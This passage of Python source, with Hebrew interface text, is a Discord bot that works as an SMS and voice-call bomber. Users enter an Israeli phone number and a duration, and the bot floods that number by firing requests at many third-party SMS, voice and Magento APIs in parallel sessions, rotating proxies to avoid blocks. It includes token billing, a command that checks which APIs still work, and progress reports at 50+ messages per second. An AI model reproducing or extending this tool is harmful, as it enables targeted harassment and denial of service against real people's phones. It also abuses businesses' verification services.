        apis = SMS_APIS
        api_name = "SMS"
    elif attack_type == "voice":
        apis = VOICE_APIS
        api_name = "שיחות"
    else:
        apis = ALL_APIS
        api_name = "הכל"
    
    # הודעת התחלה
    await interaction.followup.send(
        f"⚡ **מתקפת היפר-מהירות!**\n"
        f"📱 {phone}\n"
        f"⏱️ {duration_mins} דקות\n"
        f"🎯 {api_name} ({len(apis)} APIs)\n"
        f"🚀 מהירות: 50+ לשנייה",
        ephemeral=True
    )
    
    logging.info(f"🚀 HYPER SPEED attack - {api_name} ({len(apis)} APIs)")
    
    # 10 סשנים במקביל
    sessions = [aiohttp.ClientSession() for _ in range(10)]
    
    try:
        while datetime.now() < end_time:
            if attack_id in bot.active_attacks and not bot.active_attacks[attack_id]:
                break
            
            rounds += 1
            round_tasks = []
            proxy = await bot.proxy_manager.get_proxy()
            
            # יצירת משימות לכל הסשנים
            for session in sessions:
                for api in apis:
                    if api["type"] == "magento":
                        round_tasks.append(send_magento_fast(session, api["url"], phone_raw, proxy))
                    else:
                        round_tasks.append(send_api_fast(session, api, phone, phone_raw, proxy))
            
            # הרצת כל המשימות במקביל
            results = await asyncio.gather(*round_tasks, return_exceptions=True)
            
            # ספירת הצלחות
            round_success = sum(1 for r in results if r is True)
            total_sent += round_success
            
            # עדכון סטטיסטיקות פרוקסי
            if round_success > len(apis) * len(sessions) * 0.1:  # לפחות 10% הצלחה
                await bot.proxy_manager.report_success(proxy)
            else:
                await bot.proxy_manager.report_failure(proxy)
            
            # עדכון כל שניה
            if rounds % 3 == 0:  # בערך כל שניה (כי ישנים 0.3)
                seconds_passed = int((datetime.now() - (end_time - timedelta(minutes=duration_mins))).total_seconds())
                rate = total_sent // (seconds_passed + 1)
                
                if seconds_passed % 5 == 0:  # כל 5 שניות
                    await interaction.followup.send(
                        f"📊 **{seconds_passed}s** | {total_sent} הודעות | {rate}/שנייה | 🎯 {round_success} בסיבוב",
                        ephemeral=True
                    )
            
            # המתנה מינימלית
            await asyncio.sleep(0.2)
    
    finally:
        for session in sessions:
            await session.close()
    
    # ניקוי וסיכום
    if attack_id in bot.active_attacks:
        del bot.active_attacks[attack_id]
    
    seconds = int((end_time - (end_time - timedelta(minutes=duration_mins))).total_seconds())
    avg_rate = total_sent // (duration_mins * 60) if total_sent > 0 else 0
    
    await interaction.followup.send(
        f"✅ **הסתיים!**\n"
        f"📊 סה\"כ: {total_sent}\n"
        f"⚡ ממוצע: {avg_rate}/שנייה\n"
        f"🎯 שיא: {round_success} בסיבוב",
        ephemeral=True
    )
    
    logging.info(f"✅ HYPER SPEED ended - Total: {total_sent}, Avg: {avg_rate}/sec")

# ========== פקודות ==========
@bot.tree.command(name="check", description="בדוק אילו APIs עובדים")
async def check_command(interaction: discord.Interaction):
    await interaction.response.send_message("🔍 מתחיל בדיקה...", ephemeral=True)
    
    test_phone = "972501234567"
    test_raw = "0501234567"
    
    results = {"working": [], "failed": []}
    
    async with aiohttp.ClientSession() as session:
        for i, api in enumerate(ALL_APIS[:50]):  # בודק רק 50 ראשונים
            if api["type"] == "magento":
                success = await send_magento_fast(session, api["url"], test_raw, None)
            else:
                success = await send_api_fast(session, api, test_phone, test_raw, None)
            
            if success:
                results["working"].append(api["name"])
            
            if i % 10 == 0:
                await interaction.followup.send(f"🔄 בדקתי {i}/50...", ephemeral=True)
    
    await interaction.followup.send(
        f"✅ **{len(results['working'])}** APIs עובדים\n" +
        "\n".join(results["working"][:20]),
        ephemeral=True
    )

@bot.tree.command(name="stop", description="עצור את כל המתקפות")
async def stop_command(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    stopped = 0
    for attack_id in list(bot.active_attacks.keys()):
        if attack_id.startswith(user_id):
            bot.active_attacks[attack_id] = False
            stopped += 1
    await interaction.response.send_message(f"🛑 עצרתי {stopped} מתקפות", ephemeral=True)

# ========== ממשק משתמש ==========
class AttackModal(ui.Modal, title="💣 HYPER SPEED ATTACK"):
    phone = ui.TextInput(label="📱 מספר טלפון", placeholder="972501234567")
    duration = ui.TextInput(label="⏱️ משך בדקות", default="3", placeholder="1-30")
    attack_type = ui.TextInput(label="🎯 סוג (all/sms/voice/magento)", default="all", placeholder="all")

    async def on_submit(self, interaction: discord.Interaction):
        phone = self.phone.value.strip()
        attack_type = self.attack_type.value.strip().lower()
        
        if not phone.startswith("972"):
            await interaction.response.send_message("❌ מספר חייב להתחיל ב-972", ephemeral=True)
            return
        
        if attack_type not in ["all", "sms", "voice", "magento"]:
            await interaction.response.send_message("❌ סוג לא תקין", ephemeral=True)
            return
        
        try:
            duration = int(self.duration.value)
            if duration < 1 or duration > 60:
                await interaction.response.send_message("❌ משך 1-60 דקות", ephemeral=True)
                return
        except:
            await interaction.response.send_message("❌ משך לא תקין", ephemeral=True)
            return
        
        user_id = str(interaction.user.id)
        user_doc = await users_col.find_one({"user_id": user_id})
        
        if not user_doc:
            await users_col.insert_one({"user_id": user_id, "tokens": 1000})
            user_doc = {"tokens": 1000}
        
        if user_doc.get("tokens", 0) < 1:
            await interaction.response.send_message("❌ אין טוקנים", ephemeral=True)
            return
        
        await users_col.update_one({"user_id": user_id}, {"$inc": {"tokens": -1}})
        
        attack_id = f"{user_id}_{datetime.now().timestamp()}"
        bot.active_attacks[attack_id] = True
        
        await interaction.response.send_message(
            f"🚀 **HYPER SPEED ACTIVATED!**\n"
            f"📱 {phone}\n"
            f"⏱️ {duration} דקות\n"
            f"🎯 {attack_type}\n"
            f"💎 נותרו: {user_doc['tokens']-1}",
            ephemeral=True
        )
        
        asyncio.create_task(hyper_speed_attack(phone, duration, attack_type, user_id, interaction, attack_id))

class MainView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=180)
    
    @discord.ui.button(label="💣 HYPER SPEED", style=discord.ButtonStyle.danger)
    async def attack_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(AttackModal())
    
    @discord.ui.button(label="🔍 CHECK", style=discord.ButtonStyle.secondary)
    async def check_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await check_command(interaction)
    
    @discord.ui.button(label="🛑 STOP", style=discord.ButtonStyle.secondary)
    async def stop_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        user_id = str(interaction.user.id)
        stopped = 0
        for attack_id in list(bot.active_attacks.keys()):
            if attack_id.startswith(user_id):
                bot.active_attacks[attack_id] = False
                stopped += 1
        await interaction.response.send_message(f"🛑 עצרתי {stopped}", ephemeral=True)

@bot.tree.command(name="setup", description="פאנל שליטה")
async def setup(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    user_doc = await users_col.find_one({"user_id": user_id})
    
    if not user_doc:
        await users_col.insert_one({"user_id": user_id, "tokens": 10000})
        tokens = 10000
    else:
        tokens = user_doc.get("tokens", 0)
    
    active = len([a for a in bot.active_attacks if a.startswith(user_id) and bot.active_attacks[a]])
    
    embed = discord.Embed(
        title="⚡ HYPER SPEED EDITION",
        description=f"**{TOTAL_APIS}** APIs | {SMS_COUNT} SMS | {VOICE_COUNT} Voice | {MAGENTO_COUNT} Magento",
        color=0xff0000
    )
    embed.add_field(name="💎 טוקנים", value=f"**{tokens}**", inline=True)
    embed.add_field(name="🎯 פעילות", value=active, inline=True)
    embed.add_field(name="🚀 מהירות", value="50+/שנייה", inline=True)
    
    view = MainView()
    await interaction.response.send_message(embed=embed, view=view)

if __name__ == "__main__":
    logging.info(f"🚀 STARTING HYPER SPEED EDITION with {TOTAL_APIS} APIs")
    bot.run(TOKEN)
